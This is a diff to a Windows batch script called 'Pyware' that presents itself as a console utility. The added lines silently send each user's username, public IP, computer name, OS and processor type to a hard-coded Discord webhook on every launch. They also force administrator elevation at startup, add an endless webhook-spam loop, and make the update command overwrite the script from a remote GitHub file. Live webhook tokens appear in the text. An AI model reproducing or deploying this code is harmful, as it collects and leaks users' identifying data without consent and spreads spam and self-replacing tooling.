@@ -7,17 +7,21 @@ REM  | |   | (_) | \_/ \_/ | (_| | |  (  ___/
 REM  (_)    \__  |\__/\___/ \__ _)_)   \____)        
 REM        ( )_| |                                   
 REM         \___/   
-REM  Copyright © Pyware 2021. All Rights Reserved.           
+REM  Copyright © Pyware 2021. All Rights Reserved.
 
 :: ----------- Config ----------- ::
 
 title Loading Pyware . . . 
 if not exist %appdata%\Pyware\ goto pywarefilesdownload
+if not exist %appdata%\Pyware\paping goto pywarefilesdownload
 
 :config
 chcp 65001 >nul
+cd %appdata% >nul
 cd %appdata%\Pyware\ >nul
+mode con lines=33 cols=80 >nul
 SETLOCAL EnableDelayedExpansion >nul
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 if exist "%appdata%\Pyware\4BzIoO0Fdu.dll" goto passwd
 goto variables
 :passwd
@@ -37,30 +41,44 @@ goto passwd
 :: ----------- Variables ----------- ::
 
 :variables
-title Checking Credentials . . .
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 for /f %%a in ('powershell Invoke-RestMethod api64.ipify.org') do set PublicIPV6=%%a
 set LoginLOG=https://discord.com/api/webhooks/899201532992561202/DI-cX4ff1sPetnHtis9S1RLvhowjjzsRZTLWrUxvfjueAwALXIpmRYlKdW4JBqJhCUni
 set DDoSLOG=https://discord.com/api/webhooks/899870530419703868/4zq84JKbIqgqz42U6Rj1ZAG8T1_aMmSnAfcHA1ROOtEHMc8ftnMlpzHVSx5q1qaSXQ63
 set filepath=%~f0
 set user=root
+curl --silent -X POST -H "Content-type: application/json" --data ^
+ "{\"content\":  \"```^
+ New user login info : %DATE% : %TIME%\n \nAccount Name: %user%\n\nUsername: %USERNAME%\n\nIP Address: %PublicIP%^
+ \n\nPC Name: %COMPUTERNAME%\n\nOS: %OS%\n\nProccesorStructure: %PROCESSOR_ARCHITECTURE%```\n\"}" %LoginLOG%
 goto console
-
+for /f "tokens=5 delims= " %%a in ('vol c: ^| Find "Serial Number"') do (
+set VOLSERIAL=%%a
+)
 :: ----------- Main ----------- ::
 
 :console
 cls
 title Pyware Console [Version 0.1]
-mode con lines=33 cols=100 >nul
+mode con lines=33 cols=80 >nul
 set input= 
-echo Pyware Console [Version 0.0]
+@REM echo                          ╔═╗╦ ╦╦ ╦╔═╗╦═╗╔═╗
+@REM echo                          ╠═╝╚╦╝║║║╠═╣╠╦╝║╣ 
+@REM echo                          ╩   ╩ ╚╩╝╩ ╩╩╚═╚═╝
+@REM echo	    [+]════════════════════[+]═══════════════════[+]
+@REM echo            ║                      ║                     ║
+@REM echo            ║                      ║                     ║
+@REM echo            ║                      ║                     ║
+@REM echo            ║                      ║                     ║
+@REM echo           [+]════════════════════[+]═══════════════════[+]
+echo [38;2;255;255;255mPyware Console [Version 0.0]
 echo (c) Pyware. All rights reserved.
 echo.
 goto consoleinput
 
 :consoleinput
 set input= 
-set /p input= %USERNAME%@%user% ~ # 
+set /p input= [38;2;255;255;255m%USERNAME%@%user% ~ $ 
 set ipli=%input:~4,32%
 set pip=%input:~5,32%
 set dip=%input:~5,32%
@@ -75,9 +93,8 @@ if ["%input%"] == ["cmd %cmd%"] goto cmd
 if ["%input%"] == ["ps %ps%"] goto ps
 if ["%input%"] == ["pwd"] goto pwd
 if ["%input%"] == ["ping %pip%"] goto ping REM Pings an external IP.
-if ["%input%"] == ["color %color%"] goto color REM Sets the default console foreground and background colors.
 if ["%input%"] == ["title %title%"] goto title REM Sets the window title for a Pyware.exe session.
-if ["%input%"] == ["titlereset"] goto titlereset
+if ["%input%"] == ["title reset"] goto titlereset
 if ["%input%"] == ["webem"] goto webem
 if ["%input%"] == ["pping %ppi%"] goto pping REM  Pings an external IP with TCP port. (Not Finished)
 if ["%input%"] == ["ddos %dip%"] goto ddos REM  Redirects you to a DDosing Console. (Not Finished)
@@ -108,39 +125,34 @@ if ["%input%"] == ["x"] exit
 
 
 :invalid
-echo.
+echo [38;2;0;255;255m
 echo '%input%' is not recognized as an internal or external command.
 echo.
 goto consoleinput
 
 
 :ping
+echo [38;2;0;255;255m
 set ip=%input:~5,32%
 ping %ip% -n 3
+echo.
 goto consoleinput
 
 
 :: ----------- paping ----------- ::
 :pping
-if not "%1"=="am_admin" goto ppingadmin
+echo [38;2;0;255;255m
 cd %appdata%\Pyware\
 set /p ppp= Port: 
 paping.exe %ppi% -p %ppp% -c 3
-goto consoleinput
-
-:ppingadmin
 echo.
-echo Using the 'pping' command requires administrator privledges.
-echo If you would like to grant administrator privledges please
-echo press any key to continue . . .
-pause >nul
-if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+goto consoleinput
 :: ----------- paping ----------- ::
 
 
 :help
-mode con lines=38 cols=100 >nul
-echo.
+mode con lines=44 cols=100 >nul
+echo. [38;2;0;255;255m
 echo   ping ^<ip^>                 Pings an external IP.
 echo.
 echo   pping ^<ip^> ^<port^>         Pings an external IP with TCP port.
@@ -157,15 +169,15 @@ echo   webem                     Redirects you to a discord webhook configuratio
 echo.
 echo   update                    Updates Solar to the latest and stable version.
 echo.
-echo   color                     Sets the default console foreground and background colors.
-echo.
 echo   title                     Sets the window title for a Pyware.exe session.
 echo.
 echo   python                    Redirects you to Python Terminal (Latest Version of Python Required)
 echo.
+echo   rules                     asfjpsfjmpasfopmfomsd
+echo.
 echo   node                      Rediects you to Node.js Terminal (Latest Version of Node.js Required)
 echo.
-echo   cmd ^<command^>              Runs a Windows Command Prompt Command.
+echo   cmd ^<command^>             Runs a Windows Command Prompt Command.
 echo.
 echo   ps ^<command^>              Runs a Windows Powershell Command.
 echo.
@@ -178,21 +190,20 @@ echo.
 echo.
 echo   For more information, visit pyware.xyz
 echo.
+echo.
 goto consoleinput
-
-
-:color
-color %color%
-goto consoleinput
-
 
 :: ----------- title ----------- ::
 :title
+echo [38;2;0;255;255m
 title %title%
+echo.
 goto consoleinput
 
 :titlereset
+echo [38;2;0;255;255m
 title Pyware Console [V 0.1]
+echo.
 goto consoleinput
 :: ----------- title ----------- ::
 
@@ -219,7 +230,7 @@ echo.
 set /p input= Input: 
 if ["%input%"] == ["1"] goto new
 if ["%input%"] == ["2"] goto delwebhook
-if ["%input%"] == ["3"] goto spammer
+if ["%input%"] == ["3"] goto webspam
 if ["%input%"] == ["x"] goto console
 
 :new
@@ -227,7 +238,7 @@ cls
 set /p WebURL= Webhook URL: 
 set /p Webname= Webhook Name: 
 cls
-:input
+:inputN
 set /p say= Input: 
 if ["%say%"] == ["webhook stop"] goto webem
 set newweb=%WebURL%
@@ -235,7 +246,7 @@ curl ^
   -H "Content-Type: application/json" ^
   -d "{\"username\": \"%Webname%\", \"content\": \"%say%\"}" ^
   %newweb%
-goto input
+goto inputN
 
 :delwebhook
 cls
@@ -248,50 +259,76 @@ cls
 set /p WebURL= Webhook URL: 
 set /p Webname= Webhook Name: 
 set /p WebCon= Content: 
+timeout 2 >nul
+goto webspam1
+:webspam1
 curl ^
   -H "Content-Type: application/json" ^
   -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
   %WebURL%
+  
   curl ^
   -H "Content-Type: application/json" ^
   -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
   %WebURL%
+  timeout 1 >nul
   curl ^
   -H "Content-Type: application/json" ^
   -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
   %WebURL%
+  timeout 1 >nul
   curl ^
   -H "Content-Type: application/json" ^
   -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
   %WebURL%
-goto webspam
+  timeout 3 >nul
+  curl ^
+  -H "Content-Type: application/json" ^
+  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
+  %WebURL%
+  timeout 1 >nul
+  curl ^
+  -H "Content-Type: application/json" ^
+  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
+  %WebURL%
+  timeout 1 >nul
+  curl ^
+  -H "Content-Type: application/json" ^
+  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
+  %WebURL%
+  timeout 1 >nul
+  curl ^
+  -H "Content-Type: application/json" ^
+  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
+  %WebURL%
+goto webspam1
 
 :: ----------- webem ----------- ::
 
 
 :: ----------- update ----------- ::
 :update
-if not "%1"=="am_admin" goto updateadmin
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/AA206yt/Pyware/main/Pyware.bat -Outfile %filepath%"
+echo [38;2;0;255;255m
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/AA206yt/SFjOPAFJoANosfnioadCNM/main/Pyware.bat -Outfile %filepath%"
 echo.
 echo Successfully updated Pyware to the latest and stable version.
 echo.
 goto consoleinput
-
-:updateadmin
-echo.
-echo Using the 'update' command requires administrator privledges.
-echo If you would like to grant administrator privledges please
-echo press any key to continue . . .
-pause >nul
-if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 :: ----------- update ----------- ::
 
 
 :ddos
 cls
 echo POWERED BY HYDROAPI (OWNED BY PY)
-echo.
+echo                          ╔═╗╦ ╦╦ ╦╔═╗╦═╗╔═╗
+echo                          ╠═╝╚╦╝║║║╠═╣╠╦╝║╣ 
+echo                          ╩   ╩ ╚╩╝╩ ╩╩╚═╚═╝
+echo			     [+]════════════════════[+]═══════════════════[+]
+echo            ║                      ║                     ║
+echo            ║                      ║                     ║
+echo            ║                      ║                     ║
+echo            ║                      ║                     ║
+echo           [+]════════════════════[+]═══════════════════[+]
 timeout 3 >nul
 pause >nul
 goto main
@@ -299,6 +336,7 @@ goto main
 
 :: ----------- IPLookup ----------- ::
 :iplookup
+echo [38;2;0;255;255m
 set IP=%input:~4,32%
 goto action
 :input
@@ -351,15 +389,15 @@ for /f "delims= 	" %%i in ('findstr /i "ip hostname city region country loc org 
 	set data=!data:,=!
 	set data=!data:""=Not Listed!
 	set data=!data:"=!
-	set data=!data:ip:=[40;36mIP:		![40;37m
-	set data=!data:hostname:=[40;36mHostname:	![40;37m
-	set data=!data:city:=[40;36mCity:		![40;37m
-	set data=!data:region:=[40;36mState:	![40;37m
-	set data=!data:country:=[40;36mCountry:	![40;37m
-	set data=!data:loc:=[40;36mLocation:	![40;37m
-	set data=!data:org:=[40;36mISP:		![40;37m
-	set data=!data:postal:=[40;36mPostal:	![40;37m
-	echo [40;36m!data![40;37m
+	set data=!data:ip:=[38;2;0;255;255mIP:		!
+	set data=!data:hostname:=[40;36mHostname:	!
+	set data=!data:city:=[40;36mCity:		!
+	set data=!data:region:=[40;36mState:	!
+	set data=!data:country:=[40;36mCountry:	!
+	set data=!data:loc:=[40;36mLocation:	!
+	set data=!data:org:=[40;36mISP:		!
+	set data=!data:postal:=[40;36mPostal:	!
+	echo [40;36m!data!
 )
 echo.
 del "%temp%\%webclient%.vbs" /f /q /s >nul
@@ -369,30 +407,31 @@ goto consoleinput
 
 
 :ipinfo
-echo.
+echo [38;2;0;255;255m
 ipconfig | find /i "IPV4"
 echo.
 ipconfig | find /i "IPV6"
 echo.
-echo    [40;36mExternal IPV4 . . . . . . . . . . : %PublicIP% [40;37m
+echo    External IPV4 . . . . . . . . . . : %PublicIP%
 echo.
-echo    [40;36mExternal IPV6 . . . . . . . . . . : %PublicIPV6% [40;37m
+echo    External IPV6 . . . . . . . . . . : %PublicIPV6%
 echo.
 goto consoleinput
 
 
 :credits
-echo.
-echo     [40;36m=====================================[40;37m
-echo     [40;36m=     Pythoral - Main Developer     =[40;37m
-echo     [40;36m=     Duelawig - Main Developer     =[40;37m
-echo     [40;36m=====================================[40;37m
+echo [38;2;0;255;255m
+echo              =====================================
+echo              =     Pythoral - Main Developer     =
+echo              =     Duelawig - Main Developer     =
+echo              =====================================
 echo.
 goto consoleinput
 
 
 :: ----------- python ----------- ::
 :python
+echo [38;2;0;255;255m
 if not exist C:\Python310 goto pythoninstall
 python
 goto consoleinput
@@ -405,7 +444,7 @@ if %python% == Yes goto pythonyes
 if %python% == No goto pythonno
 if %python% == yes goto pythonyes
 if %python% == no goto pythonno
-echo '%python%' is not a valid choice.
+echo '%python%' is not a valid choice. 
 goto pythoninstall
 :pythonyes
 start https://www.python.org/
@@ -417,6 +456,7 @@ goto consoleinput
 
 :: ----------- node.js ----------- ::
 :node
+echo [38;2;0;255;255m
 if not exist "C:\Program Files\nodejs" goto nodeinstall
 node
 goto consoleinput
@@ -441,7 +481,8 @@ goto consoleinput
 
 :: ----------- cmd ----------- ::
 :cmd
-echo.
+echo [38;2;0;255;255m
+mode con lines=44 cols=100 >nul
 %cmd%
 echo.
 goto consoleinput
@@ -449,15 +490,15 @@ goto consoleinput
 
 :: ----------- powershell ----------- ::
 :ps
-echo.
+echo [38;2;0;255;255m
 powershell %ps%
-echo.
 goto consoleinput
 :: ----------- powershell ----------- ::
 
 :: ----------- password ----------- ::
 
 :pwd
+echo [38;2;0;255;255m
 cls
 set "psCommand=powershell -Command "$pword = read-host 'Enter New Password' -AsSecureString ; ^
     $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
@@ -473,28 +514,22 @@ echo.
 echo Passwords do not match. & timeout 2 >nul & goto pwd
 :didsetpass
 echo %newpass% > %appdata%\Pyware\pywarepass.pyware
-echo 0\r§mûü3F47142885E33F3EA5C8935A644E046F511B1AC02905EAC9F21E24C66998CFC+YçxâÞÀêDÿÞZOó§ UUÇ$SI¨`H.qL`4$S`ô > 4BzIoO0Fdu.dll
-certutil -encode %appdata%\Pyware\pywarepass.pyware %appdata%\Pyware\23948429348.pyware
+echo function == {true} > %appdata%\Pyware\4BzIoO0Fdu.dll >nul
+certutil -encode %appdata%\Pyware\pywarepass.pyware %appdata%\Pyware\23948429348.pyware >nul
 type %appdata%\Pyware\23948429348.pyware > %appdata%\Pyware\4BzIoO0Fdu.dll:23948429348.pyware
+attrib +h %appdata%\Pyware\4BzIoO0Fdu.dll >nul
 del %appdata%\Pyware\23948429348.pyware >nul
 del %appdata%\Pyware\pywarepass.pyware >nul
+cls
+echo.
+echo [40;36mSuccessfully updated password.
+timeout 2 >nul
 goto console
 
 :: ----------- password ----------- ::
 
-
-:fixpyware
-if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
-cd %appdata% >nul
-mkdir Pyware >nul
-cd %appdata%\Pyware\ >nul
-if not exist %appdata%\Pyware\Pyware.bat powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/AA206yt/Pyware/main/Pyware.bat -Outfile %appdata%\Pyware\Pyware.bat"
-if not exist %appdata%\Pyware\paping.exe bitsadmin /transfer paping.exe /download /priority foreground "https://github.com/AA206yt/Pyware/raw/main/paping.exe" "%appdata%\Pyware\paping.exe"
-goto consoleinput
-
-
 :pywarefilesdownload
-if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+echo [38;2;0;255;255m
 cd %appdata% >nul
 mkdir Pyware >nul
 cd %appdata%\Pyware\ >nul
